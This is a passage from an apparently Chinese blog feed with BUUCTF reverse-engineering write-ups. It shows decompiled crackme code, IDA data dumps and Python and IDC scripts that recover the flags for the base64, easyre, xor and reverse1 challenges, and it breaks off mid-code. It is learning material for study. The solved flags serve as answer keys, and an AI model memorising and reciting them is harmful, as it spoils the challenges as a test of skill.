int </span>v3; // esi</span><br><span class="line">  size_t v4; // ebx</span><br><span class="line">  _BYTE *v5; // eax</span><br><span class="line">  _BYTE *v6; // edi</span><br><span class="line"> <span class="built_in"> int </span>v7; // eax</span><br><span class="line">  _BYTE *v8; // ebx</span><br><span class="line"> <span class="built_in"> int </span>v9; // edi</span><br><span class="line">  signed<span class="built_in"> int </span>v10; // edx</span><br><span class="line"> <span class="built_in"> int </span>v11; // edi</span><br><span class="line">  signed<span class="built_in"> int </span>v12; // eax</span><br><span class="line">  signed<span class="built_in"> int </span>v13; // esi</span><br><span class="line">  _BYTE *result; // eax</span><br><span class="line">  _BYTE *v15; // [esp+Ch] [ebp-10h]</span><br><span class="line">  _BYTE *v16; // [esp+10h] [ebp-Ch]</span><br><span class="line"> <span class="built_in"> int </span>v17; // [esp+14h] [ebp-8h]</span><br><span class="line"> <span class="built_in"> int </span>v18; // [esp+18h] [ebp-4h]</span><br><span class="line"></span><br><span class="line">  v2 = a2 / 3;</span><br><span class="line">  v3 = 0;</span><br><span class="line"> <span class="built_in"> if </span>( a2 % 3 &gt; 0 )</span><br><span class="line">    ++v2;</span><br><span class="line">  v4 = 4 * v2 + 1;</span><br><span class="line">  v5 = malloc(v4);</span><br><span class="line">  v6 = v5;</span><br><span class="line">  v15 = v5;</span><br><span class="line"> <span class="built_in"> if </span>( !v5 )</span><br><span class="line">    exit(0);</span><br><span class="line">  memset(v5, 0, v4);</span><br><span class="line">  v7 = a2;</span><br><span class="line">  v8 = v6;</span><br><span class="line">  v16 = v6;</span><br><span class="line"> <span class="built_in"> if </span>( a2 &gt; 0 )</span><br><span class="line">  &#123;</span><br><span class="line">    while ( 1 )</span><br><span class="line">    &#123;</span><br><span class="line">      v9 = 0;</span><br><span class="line">      v10 = 0;</span><br><span class="line">      v18 = 0;</span><br><span class="line">      do</span><br><span class="line">      &#123;</span><br><span class="line">       <span class="built_in"> if </span>( v3 &gt;= v7 )</span><br><span class="line">          break;</span><br><span class="line">        ++v10;</span><br><span class="line">        v9 = *(unsigned __int8 *)(v3++ + a1) | (v9 &lt;&lt; 8);</span><br><span class="line">      &#125;</span><br><span class="line">      while ( v10 &lt; 3 );</span><br><span class="line">      v11 = v9 &lt;&lt; 8 * (3 - v10);</span><br><span class="line">      v12 = 0;</span><br><span class="line">      v17 = v3;</span><br><span class="line">      v13 = 18;</span><br><span class="line">      do</span><br><span class="line">      &#123;</span><br><span class="line">       <span class="built_in"> if </span>( v10 &gt;= v12 )</span><br><span class="line">        &#123;</span><br><span class="line">          *((_BYTE *)&amp;v18 + v12) = (v11 &gt;&gt; v13) &amp; 0x3F;</span><br><span class="line">          v8 = v16;</span><br><span class="line">        &#125;</span><br><span class="line">        else</span><br><span class="line">        &#123;</span><br><span class="line">          *((_BYTE *)&amp;v18 + v12) = 64;</span><br><span class="line">        &#125;</span><br><span class="line">        *v8++ = byte_407830[*((char *)&amp;v18 + v12)];</span><br><span class="line">        v13 -= 6;</span><br><span class="line">        ++v12;</span><br><span class="line">        v16 = v8;</span><br><span class="line">      &#125;</span><br><span class="line">      while ( v13 &gt; -6 );</span><br><span class="line">      v3 = v17;</span><br><span class="line">     <span class="built_in"> if </span>( v17 &gt;= a2 )</span><br><span class="line">        break;</span><br><span class="line">      v7 = a2;</span><br><span class="line">    &#125;</span><br><span class="line">    v6 = v15;</span><br><span class="line">  &#125;</span><br><span class="line">  result = v6;</span><br><span class="line">  *v8 = 0;</span><br><span class="line"> <span class="built_in"> return </span>result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>我们看下byte_407830[]里是什么，然后就很确定是base64了</p></blockquote><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">BCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz<span class="number">0123456789</span>+/=</span><br></pre></td></tr></table></figure><blockquote><p>所以flag 就是    U+J + aklw的base64解密 V1Ax的base64解密，脚本：</p></blockquote><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf8</span></span><br><span class="line">import base64</span><br><span class="line">a=<span class="string">"U"</span></span><br><span class="line">b=<span class="string">"J"</span></span><br><span class="line">c=<span class="string">"ak1w"</span></span><br><span class="line">d=<span class="string">"V1Ax"</span></span><br><span class="line">cc=base64.b64decode(c)</span><br><span class="line">dd=base64.b64decode(d)</span><br><span class="line">e=a+b+cc+dd</span><br><span class="line">print(e)<span class="comment">#UJjMpWP1</span></span><br><span class="line"><span class="comment">#所以    flag&#123;UJjMpWP1&#125;</span></span><br></pre></td></tr></table></figure><blockquote><p>这题有点难，我看了wp，回头再好好研究研究这题，有一点疑问！没弄全懂！</p></blockquote><h1 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h1><blockquote><p>这几天挺难受，但学习绝对不能停！<br><img src="https://s2.ax1x.com/2019/09/27/uuZGcR.png" alt="uuZGcR.png"></p></blockquote>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;没有妄想，没有失望！&lt;/p&gt;
    
    </summary>
    
    
      <category term="re" scheme="http://yoursite.com/tags/re/"/>
    
  </entry>
  
  <entry>
    <title>BUUCTF re部分题解0</title>
    <link href="http://yoursite.com/2019/09/26/BUUCTF%20re%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A30/"/>
    <id>http://yoursite.com/2019/09/26/BUUCTF re部分题解0/</id>
    <published>2019-09-26T15:33:08.000Z</published>
    <updated>2019-09-27T16:25:33.576Z</updated>
    
    <content type="html"><![CDATA[<p>今天不开心，我怎么也不能原谅自己，这个年纪了，该争取的就该上点心！！！这段时间没有更新博客，后来呢要一天一更！努力跑吧，走着真的来不及！今天开刷BUUCTF！</p><a id="more"></a><h1 id="easyre"><a href="#easyre" class="headerlink" title="easyre"></a>easyre</h1><blockquote><p>很简单，拖入ida 然后F5就能看到flag，到这其实就结束了，这里我稍稍复习下idc脚本语言。</p></blockquote><figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//这个是我们直接在数据段能看到的，为了更明白，我把它转成byte数据显示，见下一个代码区域！</span></span><br><span class="line">.<span class="string">rdata:</span><span class="number">0000000000429005</span> ; <span class="keyword">char</span> aFlagThisIsAEas[]</span><br><span class="line">.<span class="string">rdata:</span><span class="number">0000000000429005</span> aFlagThisIsAEas db <span class="string">'flag&#123;this_Is_a_EaSyRe&#125;'</span>,<span class="number">0</span></span><br><span class="line">.<span class="string">rdata:</span><span class="number">0000000000429005</span>                                         ; DATA <span class="string">XREF:</span> main+<span class="number">31</span>↑o</span><br><span class="line">.<span class="string">rdata:</span><span class="number">000000000042901</span>C ; <span class="keyword">char</span> aSorryYouCanTGe[]</span><br><span class="line">.<span class="string">rdata:</span><span class="number">000000000042901</span>C aSorryYouCanTGe db <span class="string">'sorry,you can'</span>,<span class="number">27</span>h,<span class="string">'t get flag'</span>,<span class="number">0</span></span><br></pre></td></tr></table></figure><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">.rdata:</span><span class="number">0000000000429005</span> <span class="comment">; char byte_429005[]</span></span><br><span class="line"><span class="symbol">.rdata:</span><span class="number">0000000000429005</span> byte_429005     <span class="built_in">db</span> <span class="number">66h</span>                  <span class="comment">; DATA XREF: main+31↑o</span></span><br><span class="line"><span class="symbol">.rdata:</span><span class="number">0000000000429006</span>                 <span class="built_in">db</span>  <span class="number">6Ch</span> <span class="comment">; l</span></span><br><span class="line"><span class="symbol">.rdata:</span><span class="number">0000000000429007</span>                 <span class="built_in">db</span>  <span class="number">61h</span> <span class="comment">; a</span></span><br><span class="line"><span class="symbol">.rdata:</span><span class="number">0000000000429008</span>                 <span class="built_in">db</span>  <span class="number">67h</span> <span class="comment">; g</span></span><br><span class="line"><span class="symbol">.rdata:</span><span class="number">0000000000429009</span>                 <span class="built_in">db</span>  <span class="number">7Bh</span> <span class="comment">; &#123;</span></span><br><span class="line"><span class="symbol">.rdata:</span>000000000042900A                 <span class="built_in">db</span>  <span class="number">74h</span> <span class="comment">; t</span></span><br><span class="line"><span class="symbol">.rdata:</span>000000000042900B                 <span class="built_in">db</span>  <span class="number">68h</span> <span class="comment">; h</span></span><br><span class="line"><span class="symbol">.rdata:</span>000000000042900C                 <span class="built_in">db</span>  <span class="number">69h</span> <span class="comment">; i</span></span><br><span class="line"><span class="symbol">.rdata:</span><span class="number">000000000042900D</span>                 <span class="built_in">db</span>  <span class="number">73h</span> <span class="comment">; s</span></span><br><span class="line"><span class="symbol">.rdata:</span>000000000042900E                 <span class="built_in">db</span>  <span class="number">5Fh</span> <span class="comment">; _</span></span><br><span class="line"><span class="symbol">.rdata:</span>000000000042900F                 <span class="built_in">db</span>  <span class="number">49h</span> <span class="comment">; I</span></span><br><span class="line"><span class="symbol">.rdata:</span><span class="number">0000000000429010</span>                 <span class="built_in">db</span>  <span class="number">73h</span> <span class="comment">; s</span></span><br><span class="line"><span class="symbol">.rdata:</span><span class="number">0000000000429011</span>                 <span class="built_in">db</span>  <span class="number">5Fh</span> <span class="comment">; _</span></span><br><span class="line"><span class="symbol">.rdata:</span><span class="number">0000000000429012</span>                 <span class="built_in">db</span>  <span class="number">61h</span> <span class="comment">; a</span></span><br><span class="line"><span class="symbol">.rdata:</span><span class="number">0000000000429013</span>                 <span class="built_in">db</span>  <span class="number">5Fh</span> <span class="comment">; _</span></span><br><span class="line"><span class="symbol">.rdata:</span><span class="number">0000000000429014</span>                 <span class="built_in">db</span>  <span class="number">45h</span> <span class="comment">; E</span></span><br><span class="line"><span class="symbol">.rdata:</span><span class="number">0000000000429015</span>                 <span class="built_in">db</span>  <span class="number">61h</span> <span class="comment">; a</span></span><br><span class="line"><span class="symbol">.rdata:</span><span class="number">0000000000429016</span>                 <span class="built_in">db</span>  <span class="number">53h</span> <span class="comment">; S</span></span><br><span class="line"><span class="symbol">.rdata:</span><span class="number">0000000000429017</span>                 <span class="built_in">db</span>  <span class="number">79h</span> <span class="comment">; y</span></span><br><span class="line"><span class="symbol">.rdata:</span><span class="number">0000000000429018</span>                 <span class="built_in">db</span>  <span class="number">52h</span> <span class="comment">; R</span></span><br><span class="line"><span class="symbol">.rdata:</span><span class="number">0000000000429019</span>                 <span class="built_in">db</span>  <span class="number">65h</span> <span class="comment">; e</span></span><br><span class="line"><span class="symbol">.rdata:</span>000000000042901A                 <span class="built_in">db</span>  <span class="number">7Dh</span> <span class="comment">; &#125;</span></span><br><span class="line"><span class="symbol">.rdata:</span>000000000042901B                 <span class="built_in">db</span>    <span class="number">0</span></span><br><span class="line"><span class="symbol">.rdata:</span>000000000042901C <span class="comment">; char aSorryYouCanTGe[]</span></span><br><span class="line"><span class="symbol">.rdata:</span>000000000042901C aSorryYouCanTGe <span class="built_in">db</span> <span class="string">'sorry,you can'</span>,<span class="number">27h</span>,<span class="string">'t get flag'</span>,<span class="number">0</span></span><br></pre></td></tr></table></figure><blockquote><p>使用idc脚本跑出flag：</p></blockquote><blockquote><p>这里有详细的介绍：<a href="http://radishes.top/2018/11/18/2018-11-18-IDC%E8%84%9A%E6%9C%AC%E8%AF%AD%E8%A8%80/" target="_blank" rel="noopener">http://radishes.top/2018/11/18/2018-11-18-IDC%E8%84%9A%E6%9C%AC%E8%AF%AD%E8%A8%80/</a></p></blockquote><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//在IDC中变量没有明确的类型。</span></span><br><span class="line"><span class="comment">//IDC使用三种数据类型：整形，字符串，浮点型。</span></span><br><span class="line"><span class="comment">//在使用变量前，都必须先声明该变量，并有局部变量和全局变量之分</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//IDC内置函数</span></span><br><span class="line"><span class="comment">//读取数据的函数：</span></span><br><span class="line"><span class="comment">//long Byte(long addr)–&gt;从虚拟地址addr读取一个字节值</span></span><br><span class="line"><span class="comment">//long Word(long addr)–&gt;从虚拟地址读取一个子(2字节)值</span></span><br><span class="line"><span class="comment">//long Dword(longaddr)–&gt;从虚拟地址读取一个双字(4字节值)</span></span><br><span class="line"><span class="comment">//bool</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//修改数据的函数</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//void PatchByte(long addr,long val)–&gt;设置虚拟地址处的一个字节值</span></span><br><span class="line"><span class="comment">//void PatchWord(long addr, long val)–&gt;设置虚拟地址处的一个字值</span></span><br><span class="line"><span class="comment">//void PatchDword(long addr, long val)–&gt;设置虚拟地址处的一个双字值</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">auto a = <span class="number">0</span>x<span class="number">00429005</span>;</span><br><span class="line">auto i,x;</span><br><span class="line">for<span class="comment">(i=0;i&lt;(0x42901C-0x429005)</span>;i=i<span class="number">+1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        x=Byte<span class="comment">(a)</span>;</span><br><span class="line">        Message<span class="comment">("%s",x)</span>;</span><br><span class="line">        a=a<span class="number">+1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">//flag&#123;this_Is_a_EaSyRe&#125;</span></span><br></pre></td></tr></table></figure><h1 id="xor"><a href="#xor" class="headerlink" title="xor"></a>xor</h1><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> *v3; <span class="comment">// rsi</span></span><br><span class="line">  <span class="keyword">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> i; <span class="comment">// [rsp+2Ch] [rbp-124h]</span></span><br><span class="line">  <span class="keyword">char</span> v6[<span class="number">264</span>]; <span class="comment">// [rsp+40h] [rbp-110h]</span></span><br><span class="line">  __int64 v7; <span class="comment">// [rsp+148h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(v6, <span class="number">0</span>, <span class="number">0x100</span>uLL);</span><br><span class="line">  v3 = (<span class="keyword">char</span> *)<span class="number">256</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Input your flag:\n"</span>, <span class="number">0L</span>L);</span><br><span class="line">  get_line(v6, <span class="number">256L</span>L);</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strlen</span>(v6) != <span class="number">33</span> )</span><br><span class="line">    <span class="keyword">goto</span> LABEL_12;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">1</span>; i &lt; <span class="number">33</span>; ++i )</span><br><span class="line">    v6[i] ^= v6[i - <span class="number">1</span>];</span><br><span class="line">  v3 = global;</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strncmp</span>(v6, global, <span class="number">0x21</span>uLL) )          <span class="comment">// 将我们输入的字符串  与global相等</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Success"</span>, v3);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">LABEL_12:</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Failed"</span>, v3);</span><br><span class="line">  result = __stack_chk_guard;</span><br><span class="line">  <span class="keyword">if</span> ( __stack_chk_guard == v7 )</span><br><span class="line">    result = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们进去看下global</p><figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">__data:</span><span class="number">0000000100001050</span> ; ===========================================================================</span><br><span class="line"><span class="string">__data:</span><span class="number">0000000100001050</span></span><br><span class="line"><span class="string">__data:</span><span class="number">0000000100001050</span> ; Segment <span class="string">type:</span> Pure data</span><br><span class="line"><span class="string">__data:</span><span class="number">0000000100001050</span> ; Segment alignment <span class="string">'qword'</span> can not be represented <span class="keyword">in</span> assembly</span><br><span class="line"><span class="string">__data:</span><span class="number">0000000100001050</span> __data          segment para <span class="keyword">public</span> <span class="string">'DATA'</span> use64</span><br><span class="line"><span class="string">__data:</span><span class="number">0000000100001050</span>                 assume <span class="string">cs:</span>__data</span><br><span class="line"><span class="string">__data:</span><span class="number">0000000100001050</span>                 ;org <span class="number">100001050</span>h</span><br><span class="line"><span class="string">__data:</span><span class="number">0000000100001050</span>                 <span class="keyword">public</span> _global</span><br><span class="line"><span class="string">__data:</span><span class="number">0000000100001050</span> ; <span class="keyword">char</span> *global</span><br><span class="line"><span class="string">__data:</span><span class="number">0000000100001050</span> _global         dq offset aFKWOXZUPFVMDGH</span><br><span class="line"><span class="string">__data:</span><span class="number">0000000100001050</span>                                         ; DATA <span class="string">XREF:</span> _main+<span class="number">10</span>D↑r</span><br><span class="line"><span class="string">__data:</span><span class="number">0000000100001050</span> __data          ends                    ; <span class="string">"f\nk\fw&amp;O.@\x11x\rZ;U\x11p\x19F\x1Fv\"M"</span>...</span><br><span class="line"><span class="string">__data:</span><span class="number">0000000100001050</span></span><br><span class="line"><span class="string">UNDEF:</span><span class="number">0000000100001060</span> ;</span><br></pre></td></tr></table></figure><p>我们把鼠标放到 aFKWOXZUPFVMDGH 上面可以看到下图<br><a href="https://imgchr.com/i/uMT0FU" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/09/28/uMT0FU.png" alt="uMT0FU.png"></a><br>但我怎么也不能将它dump，用idc也不行，纳闷了！没办法，暂时手抄下来吧！在网上查了下，发现别人的ida都可以，为何我的（这次，之前也偶尔出来过这情况）就不行呢！没有找到原因不敢说话！</p><blockquote><p>这题 思路是  我们输入的数据 a[i]^=a[a+1],然后与global数据相等，反着来就行了！<br>我们将 global[i]^global[i-1],这里注意下倒着处理的话，肯定的第一个f会处理不到，手动加上就好。</p></blockquote><blockquote><p>这里涉及到一个函数1.isinsatncce()和2.字符串反转</p></blockquote><blockquote><p>1 :<a href="https://www.runoob.com/python/python-func-isinstance.html" target="_blank" rel="noopener">https://www.runoob.com/python/python-func-isinstance.html</a></p></blockquote><blockquote><p>2 .<a href="https://www.cnblogs.com/jasmine0627/p/9510296.html" target="_blank" rel="noopener">https://www.cnblogs.com/jasmine0627/p/9510296.html</a></p></blockquote><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># a = "&#123;hello_world&#125;"</span></span><br><span class="line"><span class="comment"># for i in range(len(a)):</span></span><br><span class="line"><span class="comment"># if a[i]=='o':</span></span><br><span class="line"><span class="comment"># print("0",end="")</span></span><br><span class="line"><span class="comment"># else:</span></span><br><span class="line"><span class="comment"># print(a[i])</span></span><br><span class="line"></span><br><span class="line">x=<span class="string">""</span></span><br><span class="line"><span class="keyword">a</span>=[<span class="string">'f'</span>,<span class="number">0xA</span>,<span class="string">'k'</span>,<span class="number">0xC</span>,<span class="string">'w'</span>,<span class="string">'&amp;'</span>,<span class="string">'O'</span>,<span class="string">'.'</span>,<span class="string">'@'</span>,<span class="number">0x11</span>,<span class="string">'x'</span>,<span class="number">0xD</span>,<span class="string">'Z'</span>,<span class="string">';'</span>,<span class="string">'U'</span>,<span class="number">0x11</span>,<span class="string">'p'</span>,<span class="number">0x19</span>,<span class="string">'F'</span>,<span class="number">0x1F</span>,<span class="string">'v'</span>,<span class="string">'"'</span>,<span class="string">'M'</span>,<span class="string">'#'</span>,<span class="string">'D'</span>,<span class="number">0x0E</span>,<span class="string">'g'</span>,<span class="number">0x6</span>,<span class="string">'h'</span>,<span class="number">0x0F</span>,<span class="string">'G'</span>,<span class="string">'2'</span>,<span class="string">'O'</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="built_in">len</span>(<span class="keyword">a</span>)):</span><br><span class="line">    <span class="keyword">if</span>(isinstance(<span class="keyword">a</span>[<span class="built_in">len</span>(<span class="keyword">a</span>)-i],str)):</span><br><span class="line">        <span class="keyword">if</span>(isinstance(<span class="keyword">a</span>[<span class="built_in">len</span>(<span class="keyword">a</span>)-(i+<span class="number">1</span>)],str)):</span><br><span class="line">            x+= chr(ord(<span class="keyword">a</span>[<span class="built_in">len</span>(<span class="keyword">a</span>) - i]) ^ ord(<span class="keyword">a</span>[<span class="built_in">len</span>(<span class="keyword">a</span>) - (i+<span class="number">1</span>)]))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            x+= chr(ord(<span class="keyword">a</span>[<span class="built_in">len</span>(<span class="keyword">a</span>) - i]) ^ <span class="keyword">a</span>[<span class="built_in">len</span>(<span class="keyword">a</span>)-(i + <span class="number">1</span>)])</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        x+=chr(<span class="keyword">a</span>[<span class="built_in">len</span>(<span class="keyword">a</span>)-i]^ord(<span class="keyword">a</span>[<span class="built_in">len</span>(<span class="keyword">a</span>)-(i+<span class="number">1</span>)]))</span><br><span class="line">print(x)<span class="comment">#&#125;uHgnaiJgnoTiY_iaDnaWuiQnaiQ&#123;gal</span></span><br><span class="line">flag=<span class="string">""</span></span><br><span class="line">flag=x[::<span class="number">-1</span>]</span><br><span class="line">print(flag)<span class="comment">#lag&#123;QianQiuWanDai_YiTongJiangHu&#125;</span></span><br></pre></td></tr></table></figure><h1 id="reverse1"><a href="#reverse1" class="headerlink" title="reverse1"></a>reverse1</h1><p>拖入ida：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">__<span class="function">int64 <span class="title">sub_1400118C0</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> *v0; <span class="comment">// rdi</span></span><br><span class="line">  <span class="keyword">signed</span> __int64 i; <span class="comment">// rcx</span></span><br><span class="line">  <span class="keyword">size_t</span> v2; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">size_t</span> v3; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">char</span> v5; <span class="comment">// [rsp+0h] [rbp-20h]</span></span><br><span class="line">  <span class="keyword">int</span> j; <span class="comment">// [rsp+24h] [rbp+4h]</span></span><br><span class="line">  <span class="keyword">char</span> Str1; <span class="comment">// [rsp+48h] [rbp+28h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v8; <span class="comment">// [rsp+128h] [rbp+108h]</span></span><br><span class="line"></span><br><span class="line">  v0 = &amp;v5;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">82</span>i64; i; --i )</span><br><span class="line">  &#123;</span><br><span class="line">    *(_DWORD *)v0 = <span class="number">-858993460</span>;</span><br><span class="line">    v0 += <span class="number">4</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> ( j = <span class="number">0</span>; ; ++j )<span class="comment">//这里Str2=Str2经过一次处理后字符串</span></span><br><span class="line">  &#123;</span><br><span class="line">    v8 = j;</span><br><span class="line">    v2 = j_strlen(Str2);</span><br><span class="line">    <span class="keyword">if</span> ( v8 &gt; v2 )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">if</span> ( Str2[j] == <span class="string">'o'</span> )</span><br><span class="line">      Str2[j] = <span class="string">'0'</span>;</span><br><span class="line">  &#125;<span class="comment">//Str2中的o变成0</span></span><br><span class="line">  sub_1400111D1(<span class="string">"input the flag:"</span>);<span class="comment">//输入字符串</span></span><br><span class="line">  sub_14001128F((__int64)<span class="string">"%20s"</span>, (__int64)&amp;Str1);<span class="comment">//存放在Str1 位置</span></span><br><span class="line">  v3 = j_strlen(Str2);<span class="comment">//输入字符串长度</span></span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strncmp</span>(&amp;Str1, Str2, v3) )<span class="comment">//即要求我么输入字符串必须等于Str2</span></span><br><span class="line">    sub_1400111D1(<span class="string">"this is the right flag!\n"</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    sub_1400111D1(<span class="string">"wrong flag\n"</span>);</span><br><span class="line">  sub_14001113B(&amp;v5, &amp;unk_140019D00);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>i64;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>我们看下Str2原始数据:{hello_world}</p></blockquote><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">a = <span class="string">"&#123;hello_world&#125;"</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(a)):</span><br><span class="line"><span class="keyword">if</span> a[i]==<span class="string">'o'</span>:</span><br><span class="line"><span class="builtin-name">print</span>(<span class="string">"0"</span>,<span class="attribute">end</span>=<span class="string">""</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"><span class="builtin-name">print</span>(a[i],<span class="attribute">end</span>=<span class="string">""</span>)</span><br><span class="line"><span class="comment">#&#123;hell0_w0rld&#125;  加上flag 则flag&#123;hell0_w0rld&#125;</span></span><br></pre></td></tr></table></figure><h1 id="reverse2"><a href="#reverse2" class="headerlink" title="reverse2"></a>reverse2</h1><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span 